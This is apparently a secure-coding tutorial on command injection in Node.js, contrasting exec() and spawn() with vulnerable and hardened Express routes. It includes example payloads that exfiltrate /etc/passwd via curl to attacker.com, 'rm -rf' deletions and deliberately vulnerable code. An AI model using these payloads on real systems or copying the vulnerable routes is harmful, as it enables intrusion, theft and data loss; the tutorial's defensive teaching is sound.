# Command Injection in JavaScript/Node.js

## Definition

Command Injection is a security vulnerability that occurs when an application executes arbitrary OS commands based on unsanitized user input. In Node.js, this typically happens when user-controlled data is passed to command execution functions like `child_process.exec()`, allowing an attacker to inject and execute unintended system commands.

## How OS Commands Are Executed in Node.js

Node.js provides the `child_process` module with two primary methods for executing OS commands:

### exec() - String-Based Execution

The `exec()` function spawns a shell (`/bin/sh` on Unix or `cmd.exe` on Windows) and executes a command string within that shell. The entire command string is passed to the shell for interpretation.

```javascript
const { exec } = require('child_process');

exec('ls -la /home/user', (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`Output: ${stdout}`);
});
```

### spawn() - Argument Array Execution

The `spawn()` function launches a process directly with an argument array, bypassing shell interpretation. The first argument is the program name, and remaining arguments are passed directly to the program.

```javascript
const { spawn } = require('child_process');

const child = spawn('ls', ['-la', '/home/user']);

child.stdout.on('data', (data) => {
  console.log(`Output: ${data}`);
});
```

## How the Attack Works Step-by-Step

### Attack Vector: Shell Metacharacters

An attacker exploits shell metacharacters that have special meaning to the shell:

1. **Semicolon (`;`)** - Command separator, allows sequential execution
2. **Ampersand (`&&`)** - Conditional AND, executes next command if previous succeeds
3. **Pipe (`|`)** - Pipes output of one command to another
4. **Backticks or `$()`)** - Command substitution, executes output as a command
5. **OR operator (`||`)** - Executes next command if previous fails
6. **Background operator (`&`)** - Runs command in background

### Attack Steps

1. **Application accepts user input** - A web form or API endpoint accepts user-supplied data
2. **Input is concatenated into a command string** - The input is directly embedded into a command
3. **Command is executed with shell** - `exec()` passes the string to a shell for interpretation
4. **Shell parses metacharacters** - The shell recognizes special characters and changes command flow
5. **Arbitrary code executes** - The attacker's injected command runs with the application's privileges

### Example Attack Scenario

An application has a feature to ping a user-supplied hostname:

```javascript
const { exec } = require('child_process');

app.post('/ping', (req, res) => {
  const hostname = req.body.hostname; // User input

  exec(`ping -c 1 ${hostname}`, (error, stdout, stderr) => {
    res.send(stdout);
  });
});
```

**Normal usage:** User enters `google.com`, command becomes `ping -c 1 google.com`

**Attack payload:** User enters `google.com; rm -rf /tmp/*`
- **Resulting command:** `ping -c 1 google.com; rm -rf /tmp/*`
- **Effect:** Pings google.com, then deletes all files in /tmp

**More sophisticated attack:** User enters `google.com && cat /etc/passwd | curl http://attacker.com -d @-`
- Pings google.com, then exfiltrates the password file to attacker's server

## Vulnerable Code Example

```javascript
// VULNERABLE: User input directly concatenated into shell command
const { exec } = require('child_process');
const express = require('express');
const app = express();

app.use(express.json());

// Route 1: Vulnerable ping service
app.post('/vulnerable/ping', (req, res) => {
  const hostname = req.body.hostname;

  // VULNERABLE: hostname is directly concatenated
  exec(`ping -c 1 ${hostname}`, (error, stdout, stderr) => {
    if (error) {
      res.status(500).send(`Error: ${error.message}`);
      return;
    }
    res.send(stdout);
  });
});

// Route 2: Vulnerable file operations
app.post('/vulnerable/process-file', (req, res) => {
  const filename = req.body.filename;

  // VULNERABLE: filename could contain directory traversal or command injection
  exec(`cat ${filename} | grep -i error | wc -l`, (error, stdout, stderr) => {
    res.send(`Found ${stdout} errors`);
  });
});

// Route 3: Vulnerable database backup
app.post('/vulnerable/backup', (req, res) => {
  const dbName = req.body.database;

  // VULNERABLE: database name not validated
  exec(`mysqldump ${dbName} > /tmp/backup.sql`, (error, stdout, stderr) => {
    res.send('Backup completed');
  });
});

// Attack examples that would succeed against these routes:
// 1. POST /vulnerable/ping with {"hostname": "8.8.8.8; whoami"}
// 2. POST /vulnerable/ping with {"hostname": "8.8.8.8 && curl http://attacker.com/steal?data=$(cat /etc/passwd)"}
// 3. POST /vulnerable/process-file with {"filename": "/etc/passwd"}
// 4. POST /vulnerable/backup with {"database": "mydb; DROP TABLE users; --"}
```

## Secure Code Example

```javascript
// SECURE: Using spawn with argument array
const { spawn } = require('child_process');
const express = require('express');
const app = express();

app.use(express.json());

// Route 1: Secure ping using spawn with argument array
app.post('/secure/ping', (req, res) => {
  const hostname = req.body.hostname;

  // Validate hostname format
  if (!isValidHostname(hostname)) {
    res.status(400).send('Invalid hostname');
    return;
  }

  // SECURE: Using spawn with argument array
  // Arguments are passed directly to the program, not interpreted by shell
  const ping = spawn('ping', ['-c', '1', hostname]);

  let output = '';
  ping.stdout.on('data', (data) => {
    output += data;
  });

  ping.on('close', (code) => {
    res.send({ output, exitCode: code });
  });
});

// Route 2: Secure file processing with path validation
app.post('/secure/process-file', (req, res) => {
  const filename = req.body.filename;

  // Validate that filename doesn't contain path traversal
  if (filename.includes('..') || filename.startsWith('/')) {
    res.status(400).send('Invalid filename');
    return;
  }

  // Use whitelist of allowed files
  const allowedDir = '/safe/files/';
  const fullPath = path.join(allowedDir, path.basename(filename));

  // Verify the resolved path is within allowed directory
  if (!fullPath.startsWith(allowedDir)) {
    res.status(400).send('Access denied');
    return;
  }

  // SECURE: Use spawn with array of arguments
  const grep = spawn('grep', ['-i', 'error', fullPath]);
  const wc = spawn('wc', ['-l']);

  grep.stdout.pipe(wc.stdin);

  let output = '';
  wc.stdout.on('data', (data) => {
    output += data;
  });

  wc.on('close', (code) => {
    res.send(`Found ${output.trim()} errors`);
  });
});

// Route 3: Secure database backup with validation
app.post('/secure/backup', (req, res) => {
  const dbName = req.body.database;

  // Validate database name (alphanumeric and underscores only)
  if (!/^[a-zA-Z0-9_]+$/.test(dbName)) {
    res.status(400).send('Invalid database name');
    return;
  }

  // Whitelist of allowed databases
  const allowedDatabases = ['mydb', 'userdb', 'analyticsdb'];
  if (!allowedDatabases.includes(dbName)) {
    res.status(400).send('Database not allowed');
    return;
  }

  // SECURE: Use spawn with argument array
  const mysqldump = spawn('mysqldump', [dbName]);

  const backupFile = fs.createWriteStream(`/tmp/backup_${Date.now()}.sql`);
  mysqldump.stdout.pipe(backupFile);

  mysqldump.on('close', (code) => {
    if (code === 0) {
      res.send('Backup completed successfully');
    } else {
      res.status(500).send('Backup failed');
    }
  });
});

// Input validation helper
function isValidHostname(hostname) {
  // IPv4 format
  const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
  if (ipv4Regex.test(hostname)) {
    // Validate each octet is 0-255
    const parts = hostname.split('.');
    return parts.every(part => parseInt(part) >= 0 && parseInt(part) <= 255);
  }

  // Hostname format (alphanumeric, hyphens, dots, no special chars)
  const hostnameRegex = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  return hostnameRegex.test(hostname);
}

const path = require('path');
const fs = require('fs');
```

## Difference Between exec() and spawn()

| Aspect | exec() | spawn() |
|--------|--------|--------|
| **Shell Invocation** | Spawns a shell (`/bin/sh` or `cmd.exe`) | Directly launches the process |
| **Input Format** | String (shell command) | Program name + argument array |
| **Shell Metacharacters** | Interpreted by shell (vulnerable) | Treated as literal strings (safe) |
| **Argument Injection** | Possible through metacharacters | Not possible with array arguments |
| **Buffer Size** | Limited (default 1MB) | No limit, streams data |
| **Performance** | Slower (shell overhead) | Faster (no shell overhead) |
| **Use Case** | Simple commands, inline scripts | Production applications, large output |

## Input Validation Strategies

### 1. Whitelist Approach (Recommended)

```javascript
const ALLOWED_OPERATIONS = {
  'backup': true,
  'restore': true,
  'verify': true
};

const operation = req.body.operation;
if (!ALLOWED_OPERATIONS[operation]) {
  throw new Error('Invalid operation');
}
```

### 2. Format Validation

```javascript
// For hostnames
function validateHostname(hostname) {
  const regex = /^[a-zA-Z0-9.-]+$/;
  return regex.test(hostname) && hostname.length <= 253;
}

// For email addresses
function validateEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

// For numbers
function validatePort(port) {
  const num = parseInt(port);
  return num > 0 && num <= 65535;
}
```

### 3. Length Limits

```javascript
const MAX_HOSTNAME_LENGTH = 253;
const MAX_FILENAME_LENGTH = 255;

if (req.body.hostname.length > MAX_HOSTNAME_LENGTH) {
  throw new Error('Hostname too long');
}
```

### 4. Allowlist Directory Access

```javascript
const path = require('path');
const SAFE_BASE_DIR = '/var/app/data';

function isSafeFilePath(userPath) {
  const fullPath = path.resolve(SAFE_BASE_DIR, userPath);
  return fullPath.startsWith(SAFE_BASE_DIR);
}
```

## Avoiding shell: true

Never use the `shell: true` option, as it enables shell interpretation even with `spawn()`:

```javascript
// VULNERABLE: Using shell: true with spawn
const { spawn } = require('child_process');
const arg = 'file.txt; rm -rf /';

spawn('cat', [arg], { shell: true }); // VULNERABLE!
// This will execute: /bin/sh -c "cat file.txt; rm -rf /"

// SECURE: Without shell: true
spawn('cat', [arg]); // Safe - treats arg as literal string
// This executes: cat "file.txt; rm -rf /"
```

## Additional Security Mitigations

### 1. Run with Least Privilege

```javascript
// Use setuid/setgid to run with minimal required permissions
const { spawn } = require('child_process');

const child = spawn('ping', [hostname], {
  uid: 1000, // Run as unprivileged user
  gid: 1000
});
```

### 2. Set Resource Limits

```javascript
const { spawn } = require('child_process');

const child = spawn('ping', [hostname], {
  timeout: 5000, // Kill after 5 seconds
  maxBuffer: 1024 * 100 // Limit output to 100KB
});
```

### 3. Timeout Protection

```javascript
const { spawn } = require('child_process');

function executeWithTimeout(command, args, timeout = 5000) {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args);
    const timer = setTimeout(() => {
      child.kill();
      reject(new Error('Command timeout'));
    }, timeout);

    child.on('close', () => {
      clearTimeout(timer);
      resolve();
    });
  });
}
```

### 4. Environment Isolation

```javascript
const { spawn } = require('child_process');

const child = spawn('ping', [hostname], {
  env: {
    PATH: '/usr/bin:/bin', // Restricted PATH
    // Do not inherit all environment variables
  },
  cwd: '/safe/working/directory' // Restricted working directory
});
```

## Best Practices

1. **Always use spawn() over exec()** - Use argument arrays instead of string concatenation
2. **Never concatenate user input** - Even if you think it's validated
3. **Whitelist allowed values** - Use enums or allowlists for user input
4. **Validate input format** - Use regex patterns appropriate for the input type
5. **Implement length limits** - Prevent buffer overflow and path traversal attacks
6. **Use absolute paths** - Always reference absolute paths, never relative
7. **Run with minimal privileges** - Use uid/gid options to restrict process permissions
8. **Implement timeouts** - Prevent long-running processes from hanging
9. **Log all command executions** - Monitor for suspicious command patterns
10. **Use helper libraries** - Consider using safer alternatives like the `shell-escape` module for specific use cases
11. **Never trust user input** - Apply security controls even to input from authenticated users
12. **Review third-party dependencies** - Ensure child_process is not being invoked by vulnerable libraries

## Complete Secure Implementation Example

```javascript
const { spawn } = require('child_process');
const express = require('express');
const app = express();

app.use(express.json());

// Validation middleware
function validateHostname(hostname) {
  if (!hostname || typeof hostname !== 'string') return false;
  if (hostname.length > 253) return false;

  // Reject if contains shell metacharacters
  if (/[;&|`$(){}[\]<>!]/.test(hostname)) return false;

  // Allow IPv4, IPv6, and domain names
  const ipv4 = /^(\d{1,3}\.){3}\d{1,3}$/;
  const domainName = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

  return ipv4.test(hostname) || domainName.test(hostname);
}

// Secure ping endpoint
app.post('/ping', (req, res) => {
  const hostname = req.body.hostname;

  if (!validateHostname(hostname)) {
    return res.status(400).json({ error: 'Invalid hostname' });
  }

  const ping = spawn('ping', ['-c', '1', hostname], {
    timeout: 5000,
    maxBuffer: 1024 * 50
  });

  let output = '';
  let hasError = false;

  ping.stdout.on('data', (data) => {
    output += data.toString();
  });

  ping.stderr.on('data', (data) => {
    hasError = true;
    output += data.toString();
  });

  ping.on('close', (code) => {
    if (code === 0) {
      res.json({ success: true, output: output.trim() });
    } else {
      res.status(500).json({ error: 'Ping failed', output: output.trim() });
    }
  });

  ping.on('error', (err) => {
    res.status(500).json({ error: 'Failed to execute ping', message: err.message });
  });
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Node.js child_process Documentation: https://nodejs.org/api/child_process.html
- CWE-78: Improper Neutralization of Special Elements used in an OS Command: https://cwe.mitre.org/data/definitions/78.html
